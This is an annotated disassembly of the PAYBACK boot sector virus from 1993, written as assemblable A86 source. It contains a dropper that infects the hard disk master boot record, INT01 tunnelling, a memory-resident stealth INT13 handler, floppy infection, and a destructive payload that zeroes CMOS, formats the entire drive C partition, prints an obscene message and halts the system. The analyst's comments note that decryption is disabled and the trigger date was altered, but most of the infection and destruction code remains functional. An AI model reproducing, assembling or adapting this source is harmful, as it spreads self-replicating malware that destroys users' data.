;*****************************************************************************
;*                                                                           *
;*      FILE:            PAYBACK.A86                                         *
;*      PURPOSE:         Dropper containing PAYBACK boot sector virus        *
;*      DISASSEMBLY BY:  Willoughby     AUTHOR:  Unknown clever coder        *
;*                                                                           *
;*****************************************************************************

MAIN            SEGMENT BYTE
                ASSUME  CS:MAIN,DS:MAIN,ES:MAIN

ORG             100h

;*****************************************************************************
;Decryption routine to decrypt body of virus.  Not used in this file as virus 
;has already been decrypted for analysis.  Bit sequence of encryption/decryp-
;tion key possibly chosen for its randomized bit sequence (just a guess).

;DECRYPT:
;        MOV     CX,02A8                 ;set length of encrypted code
;        MOV     AX,0391D                ;load decryption key (bit sequence
;                                        ;"0011100100011101")
;        MOV     SI,OFFSET MBR_BUFFER    ;point to end of encrypt. code
;DECLP1: DEC     CX                      ;decrement byte count
;        JS      DROPPER                 ;if done, jump to dropper start
;        XOR     [SI],AL                 ;decrypt a byte      
;        XCHG    AH,AL                   ;change key        
;        ROR     AX,CL                   ;really mix it up
;        DEC     SI                      ;point to next byte to decrypt
;        JMP     DECLP1                  ;do it all again   

;****************************************************************************
;Dropper routine to place virus in MBR of fixed disk "C".

DROPPER:
        MOV     AX,03513                ;get INT13 vector.         
        INT     021                                    
        MOV     [OFFSET VECT_INT13],BX    ;store offset of INT13 in virus
        MOV     [OFFSET VECT_INT13+2],ES  ;store segment of INT13 in virus
        CALL    STEAL_INT01               ;jump to steal INT01 routine
        MOV     AX,0201                 ;select read-one-sector function
        MOV     BX,OFFSET MBR_BUFFER    ;set disk I/O buffer offset 
        MOV     CX,0001                 ;cylinder 0, sector 1      
        MOV     DX,0080                 ;head 0, fixed disk "C"    
        CALL    SYS_INT13               ;read boot sector of drive "C" 
        JB      RUN_CARRIER             ;if flag = failure, execute carrier   
        CMP     WORD PTR [BX+010],012CD ;check for infection tag   
        JE      RUN_CARRIER             ;if infected, execute carrier program
        XOR     AX,AX                                              
        MOV     DS,AX                   ;point to data segment 0000h    
        MOV     AX,[046C]               ;load lower two bytes of master clock
        PUSH    CS                                                 
        POP     DS                      ;restore data segment
        TEST    AL,01                   ;AL=01 in 1 out of 2 tries (clock LSB)
        JZ      RUN_CARRIER             ;if AL <> 01, do not infect system     
        SUB     BX,0200                 ;set disk I/O buffer to point to virus
        MOV     AX,0302                 ;select write-two-sectors  
        CALL    SYS_INT13               ;write virus to MBR and original
                                        ;boot sector to sector 2.

;****************************************************************************
;Routine to restore original jump address to start of trojan file and to 
;execute trojan carrier program.  We don't use it here since the virus is not 
;attached to anything (other than its own dropper).  Instead, the replacement
;RUN_CARRIER routine below it is executed to terminate the dropper.

;RUN_CARRIER:
;        MOV     DI,0100                 ;point to carrier prog. start
;        MOV     WORD PTR [DI],030B4     ;restore original jump value
;        MOV     BYTE PTR [DI+02],CD     ;ditto     
;        XOR     AX,AX                              
;        PUSH    DI                      ;zero DI   
;        RET                             ;exit and execute carrier program

RUN_CARRIER:
        MOV     AX,04C00                ;select terminate-with-return-code
        INT     021                     ;terminate PAYBACK.COM dropper

;*****************************************************************************
;Routine to steal INT01 for tunnelling purposes and then restore it to its 
;original value.  Tunnelling is new to me, so I hope that I got this right.

STEAL_INT01:
        MOV     AX,03501                ;get INT01 (single-step) vector
        INT     021                                                        
        MOV     DX,[OFFSET FIND_INT13]  ;offset of virus INT01 handler 
        MOV     AH,025                  ;steal INT01 vector               
        INT     021                                                        
        PUSHF                                                             
        POP     AX                      ;pop flags into AX                
        OR      AH,01                   ;set trap flag                       
        PUSH    AX                                                        
        POPF                            ;pop AX into flag register (from this
                                        ;point on, every instruction execution
                                        ;also executes the viral INT01 
                                        ;handler)
        XOR     AX,AX                   ;zero AX                          
        CALL    SYS_INT13               ;reset disks to allow INT01 tunnelling
                                        ;to find BIOS INT13 handler address
        PUSHF                                                             
        POP     AX                      ;pop flags into AX                
        AND     AH,0FE                  ;zero trap flag                   
        PUSH    AX                                                        
        POPF                            ;pop AX into flag register        
        MOV     AX,02501                ;set-interrupt-vector function (INT01)
        MOV     DX,BX                   ;load DX with orig. INT01 offset  
        PUSH    ES                                                        
        POP     DS                      ;load DS with orig. INT01 segment 
        INT     21                      ;restore INT01 vector to orig. value
        PUSH    CS                                                        
        PUSH    CS                                                        
        POP     DS                      ;set DS and ES to value of          
        POP     ES                      ;code segment                          
        RET                                                               

;*****************************************************************************
;INT01 handler routine to accomplish tunnelling address aquisition for 
;original INT13 handler.

FIND_INT13:
        PUSH    BP                                                        
        MOV     BP,SP                   ;load BP with the stack offset 
        PUSH    AX                                                        
        MOV     AX,[BP+04]              ;load AX with the segment of the 
                                        ;calling routine           
        CMP     AX,0C800                ;is it in DOS segment?               
        JNB     TUNNEL                  ;if not, its time to tunnel       
    
EXIT:   POP     AX                      ;restore registers                
        POP     BP                                                        
        IRET                            ;return from INT01 interrupt      

TUNNEL:
        CMP     AX,0F000                ;calling routine in ROM?          
        JA      EXIT                    ;if so, no need to tunnel, so exit
        CS:                                ;if not, store orig. INT13 segment
        MOV     [OFFSET VECT_INT13+02],AX  ;for use during MBR infection
        MOV     AX,[BP+02]                 ;load AX with original INT13 offset
        CS:                                                               
        MOV     [OFFSET VECT_INT13],AX    ;store original INT13 handler offset
        AND     WORD PTR [BP+06],0FEFF    ;clear trap flag on stack prior to
        JMP     EXIT                    ;return to prevent re-execution of 
                                        ;this INT01 handler

SYS_INT13:
        PUSHF                             ;preserve flags
        CS:                                        
        CALL    FAR D[OFFSET VECT_INT13]  ;call INT13 handler via stored addr.
        RET                           

;*****************************************************************************
;Start of boot sector virus code.

BOOT:   CLI                             ;disable interrupts
        XOR     AX,AX                              
        MOV     DS,AX                   ;set data segment              
        MOV     SS,AX                   ;set stack segment              
        MOV     SP,0FFFE                ;set stack pointer              
        STI                             ;enable interrupts         
        PUSH    DS                      ;preserve DS               
        DEC     WORD PTR [0413]         ;lower top of memory 1K    
        INT     012                     ;get base memory size
        MOV     CL,0A                   ;set rotation count        
        ROR     AX,CL                   ;calculate upper memory segment
        LES     BX,[004C]               ;get BIOS INT13h handler offset & seg.
        MOV     [07DB7],BX              ;store orig. offset within virus
        MOV     [07DB9],ES              ;store orig. segment within virus
        MOV     WORD PTR [004C],008D    ;set INT13h offset vector to virus
        MOV     [004E],AX               ;set vector to installed virus seg.
        MOV     ES,AX                   ;set ES to installed virus segment
        XOR     DI,DI                   ;zero destination offset for move
        MOV     SI,07C00                ;set source address for virus move
        PUSH    SI                      ;set SI for orig. boot sector load
        MOV     CX,02C8                 ;set byte count for move (a count of 
                                        ;0200h would have been adequate)  
        CLD                             ;clear direction flag (fwd)
        REPZ                                                       
        MOVSB                           ;move virus to upper memory
        PUSH    ES                      ;set up stack for virus reentry seg.
        MOV     AX,003F                 ;AX = offset for virus reentry point
        PUSH    AX                      ;set up stack for virus reentry off.
        RETF                            ;return to self in new location (ES:AX)

NEW_LOCATION:
        MOV     AX,0201                 ;select read-one-sector function
        POP     BX                      ;set disk I/O buffer to 7C00h
        MOV     CX,0002                 ;track 0, sector 2 (self modified by 
                                        ;virus to reflect true MBR location)
        MOV     DX,0080                 ;head 0, fixed disk "C" (once again, 
                                        ;self-modified by virus)   
        AND     DL,080                  ;mask to load original MBR from drive
                                        ;"C", even if not boot drive, or drive
                                        ;"A" if boot is from floppy
        POP     ES                      ;set ES = 0000h            
        CALL    BIOS_INT13              ;load original boot sector to 0:7C00
        PUSH    CS                                                          
        POP     DS                      ;set to current upper-mem. seg. value
        PUSH    CS                                                 
        POP     ES                      ;ditto                     
        MOV     AX,0201                 ;select read-one-sector function
        MOV     BX,0200                 ;set I/O buffer location   
        MOV     CX,0001                 ;track 0, sector 1         
        MOV     DX,0080                 ;head 0, fixed disk "C"    
        CALL    BIOS_INT13              ;load MBR                        
        CMP     WORD PTR [0210],012CD   ;check for infect tag      
        JE      BOOT_EXIT               ;if infected, exit
        CMP     WORD PTR [03FE],0AA55   ;valid boot record tag?    
        JNE     BOOT_EXIT               ;if not, then exit         
        MOV     AX,0302                 ;select write-two-sectors function
        XOR     BX,BX                   ;set buffer offset to include virus
        INC     CX                      ;track 0, sector 2 (relocated MBR)
        MOV     [0044],CX               ;store track/sector within viral code
        MOV     [0047],DX               ;store head/drive within viral code 
        DEC     CX                      ;track 0, sector 1         
        CALL    BIOS_INT13              ;write virus to MBR and original MBR 
                                        ;to sector 2.
BOOT_EXIT:                                           
        CALL    CHECK_DATE              ;check for activation date
        JMP     0000:07C00              ;wrong date, so jump to original MBR

;*****************************************************************************
;INT13h handler routine.

STEALTH:
        CMP     CX,+01                  ;track 0, sector 1?
        JNE     EXIT2BIOS               ;if not, no need for stealth, so exit
        OR      DH,DH                   ;head 0?   
        JNE     EXIT2BIOS               ;ditto     
        CMP     AH,02                   ;read request?                        
        JE      ORIG_SECT               ;if so, time for stealth...      

EXIT2BIOS:
        CS:                                                                   
        JMP     FAR D[01B7]             ;jump to BIOS via stored address      

EXIT2CALL:
        RETF    0002                    ;exit to calling routine              

ORIG_SECT:
        CALL    BIOS_INT13              ;read boot sector                     
        JB      EXIT2CALL               ;if flag=failure, exit to calling rtn.
        ES:                                                                   
        CMP     WORD PTR [BX+0010],012CD  ;check for infection tag              
        JNE     INFECT_FLOPPY             ;if not infected, then infect
        MOV     AX,0201                 ;select read-one-sector function      
        PUSH    CX                      ;preserve registers values            
        PUSH    DX                      ;for boot sector                      
        ES:                                                                   
        MOV     CX,[BX+0044]            ;load track/sect. # of orig. boot rcd.
        ES:                                                                   
        MOV     DH,[BX+0048]            ;load head # of original boot record 
        CALL    BIOS_INT13              ;load original boot record            
        POP     DX                      ;restore registers to values          
        POP     CX                      ;sent by calling routine               
        JMP     EXIT2CALL               ;exit directly back to calling routine

;*****************************************************************************
;Diskette infection routine.  Very clever and code efficient (to me, anyway).

INFECT_FLOPPY:
        PUSHF                           ;push flags to hide I/O errors        
        PUSH    AX                      ;preserve registers                   
        PUSH    BX                                                            
        PUSH    CX                                                            
        PUSH    DX                                                            
        PUSH    DI                                                            
        PUSH    ES                                                            
        PUSH    CX                      ;save a few register values a         
        PUSH    DX                      ;second time to be used by            
        PUSH    BX                      ;the virus interrupt handler          
        TEST    DL,080                  ;fixed drive I/O?                     
        JNZ     EXIT_1                  ;if so, then exit handler            
        ES:                                                                   
        CMP     WORD PTR [BX+01FE],0AA55  ;boot sect. in buffer?             
        JNE     EXIT_1                    ;if not, exit handler                 
        CALL    CALC_TRACK              ;if so, calc. reloc. track/sector #
        JB      EXIT_1                  ;if not standard format, exit         
        CS:                                                                   
        MOV     [0044],CX               ;store reloc. track/sect. within virus 
        CS:                                                                   
        MOV     [0047],DX               ;store reloc. head/drive within virus
        POP     BX                      ;restore orig. buffer offset          
        MOV     AX,0301                 ;select write-one-sector              
        PUSH    AX                                                            
        CALL    BIOS_INT13              ;relocate boot sector                 
        POP     AX                      ;restore some registers               
        POP     DX                                                            
        POP     CX                                                            
        JB      EXIT_2                  ;if I/O flag = failure, exit          
        XOR     BX,BX                   ;set I/O buffer to virus start        
        PUSH    CS                                                            
        POP     ES                      ;set ES=CS                            
        CALL    BIOS_INT13              ;write virus to boot sector           
        JMP     EXIT_2                  ;exit handler                         
                                                                              
EXIT_1:
        POP     BX                      ;restore registers                    
        POP     DX                                                            
        POP     CX                                                            
                                                                      
EXIT_2:
        POP     ES                      ;restore registers                    
        POP     DI                                                            
        POP     DX                                                            
        POP     CX                                                            
        POP     BX                                                            
        POP     AX                                                            
        POPF                            ;pop flags to hide I/O errors         
        JMP     EXIT2BIOS               ;jump to exit to BIOS                 
                                                                      
CALC_TRACK:
        MOV     DI,DX                   ;load DI with head/drive #            
        ES:                                                                   
        MOV     AX,[BX+013]             ;load total # sectors on disk from BPB
        ES:                                                                   
        MOV     CX,[BX+018]             ;load # of sectors per track from BPB   
        OR      AX,AX                   ;test AX for 00h                      
        JZ      BPB_FAIL                ;if zero, non-standard format, so exit
        JCXZ    BPB_FAIL                ;ditto for CX                         
        XOR     DX,DX                   ;clear DX for remainder storage       
        DIV     CX                      ;divide AX by CX                      
        OR      DX,DX                   ;test DX for 00h (no remainder)       
        JNZ     BPB_FAIL                ;if <> 0, non-standard format, so exit
        ES:                                                                   
        MOV     BX,[BX+01A]             ;load # of disk sides from BPB        
        OR      BX,BX                   ;test BX for 00h                      
        JZ      BPB_FAIL                ;if zero, non-standard format, so exit
        DIV     BX                      ;divide AX by BX                      
        OR      DX,DX                   ;test DX for 00h (no remaider)        
        JNZ     BPB_FAIL                ;if <> 0, non-standard format, so exit
        DEC     AL                      ;decr. AL to obtain # of last track
        MOV     CH,AL                   ;set track # for boot sect. relocation
        DEC     BL                      ;decr. BL to obtain # of last head    
        MOV     DX,DI                   ;restore head/drive information       
        MOV     DH,BL                   ;set head # to last head              
        CLC                             ;clear carry flag to indicate success 
        RET                                                                   
                                                                      
BPB_FAIL:
        STC                             ;set carry flag to indicate failure   
        RET                                                                   
                                                                      
BIOS_INT13:                                                         
        PUSHF                           ;push flags                   
        CS:                                        
        CALL    FAR D[01B7]             ;call BIOS INT13h handler via stored
        RET                             ;address   

;****************************************************************************
;Check date for activation (routine modified to prevent activation).

CHECK_DATE:    
        MOV     AH,04                   ;request date function    
        INT     01A                     ;request date                     
        CMP     DX,02BAD                ;check for trigger date
        JE      ZAP_CMOS                ;the route to unethical (and illegal)
        RET                             ;behavior                         

;****************************************************************************
;Clear contents of CMOS system configuration memory.
                                                                  
ZAP_CMOS:                                                         
        MOV     CX,00FF                 ;set CMOS count (03Ch would have been 
                                        ;adequate, according to my reference)
ZCLP1:  MOV     DX,0070                 ;set port #70h            
        MOV     AL,CL                   ;set configuration address
        OUT     DX,AL                   ;select CMOS address
        JMP     WHY                     ;don't understand the need for this
WHY:    INC     DX                      ;set port #71h            
        XOR     AL,AL                   ;set data value to zero   
        OUT     DX,AL                   ;write data value to CMOS 
        LOOP    ZCLP1                   ;do it until CMOS count = 0

;*****************************************************************************
;Obtain format data from fixed disk "C" partition table.

        MOV     DI,[03C4]               ;ending cyl/sector #'s from prtn. tbl.
        AND     DI,-040                 ;mask out ending sector number   
        MOV     CL,06                   ;load CL with number of shifts   
        SHR     DI,CL                   ;shift to obtain ending cylinder # 
        MOV     AL,[03C3]               ;ending head # from partition table
        XOR     AH,AH                   ;zero AH                         
        XCHG    BP,AX                   ;store ending head # in BP       
        MOV     BX,01F5                 ;point to sector format info. table
        MOV     DX,0080                 ;select fixed disk "C"              

;*****************************************************************************
;Trash fixed disk "C" by formatting entire partition.  If my interpretation of
;this routine is correct, it formats each platter side before incrementing the
;head count to format the next platter.  The destructive "advantage" of this,
;I believe, would be that the deletion of code segments from large numbers
;of files would be accomplished very quickly, rendering executable or ZIPed
;files as useless as if they were totally deleted, but in a much shorter time.

TRASH_HD:
        XOR     CX,CX                   ;set cylinder # to zero          
                                                                  
FORMAT_TRACK:
        MOV     AX,0501                 ;format-track function, interleave 1
        CALL    BIOS_INT13              ;format track (cylinder)         
        AND     CL,0C0                  ;mask for cylinder # bits 6-7
        ROL     CL,01                   ;shift to bits 6-7 of cylinder number
        ROL     CL,01                   ;into bottom two (0-1) bits of CL 
        XCHG    CL,CH                   ;put bottom two bits in CH to match 
                                        ;DI bit arrangement
        INC     CX                      ;increment track count           
        CMP     CX,DI                   ;last cylinder (CX bit pattern match 
                                        ;DI bit pattern)?
        JA      NEXT_HEAD               ;if so, increment head number    
        XCHG    CL,CH                   ;put CL back to where it started 
        ROR     CL,01                   ;shift to obtain                 
        ROR     CL,01                   ;original value
        JMP     FORMAT_TRACK            ;format next track               

NEXT_HEAD:
        INC     DH                      ;increment head number           
        MOV     AX,BP                   ;load AX with last head number   
        CMP     DH,AL                   ;last head?
        JBE     TRASH_HD                ;if not, do it again             

;****************************************************************************
;Display activation message.

        MOV     SI,OFFSET MESSAGE_TEXT  ;load offset of message text
DMLP1:  CLD                             ;clear direction flag (fwd)
        LODSB                           ;load character of message         
        OR      AL,AL                   ;check for text end (0)             
        JZ      LOCK_IT_UP              ;if end of message, lock up system
        MOV     AH,0E                   ;select write-character function
        XOR     BX,BX                   ;page 0, color 0
        INT     010                     ;display character on screen
        JMP     DMLP1                   ;do it all again

LOCK_IT_UP:
        CLI                             ;disable interrupts
        HLT                             ;select 0.0 Mips mode

;*****************************************************************************
;Storage area for BIOS INT13 vector used by virus.

        DB      ?                       ;Pad byte (A86 assembly only)
        DW      ?                       ;BIOS INT13 offset storage location
        DW      ?                       ;BIOS INT13 segment storage location

;*****************************************************************************
;Text strings for activation message.

MESSAGE_TEXT:
        DB      0A,0D                                ;linefeed, carriage ret.
        DB      "That was for ARCV, mother fucker!"
        DB      0A,0A,0D                             ;linefeed x 2, car. ret.
        DB      "Payback! (c) 1993"
        DB      0A,0D                                ;linefeed, carriage ret.

;*****************************************************************************
;End-of-boot sector pad bytes and valid boot sector tag bytes.

        DB      10 DUP ?                             ;pad bytes
        DB      055,0AA                              ;valid boot sector tag

;****************************************************************************
;Start of space reserved for disk I/O

MBR_BUFFER:

        DB      512 DUP ?               ;reserve one sectors worth of space

;****************************************************************************
;Storage location for INT13 vector used by dropper routine.

VECT_INT13:

        DD      ?                       ;BIOS INT13 offset/segment storage

MAIN    ENDS

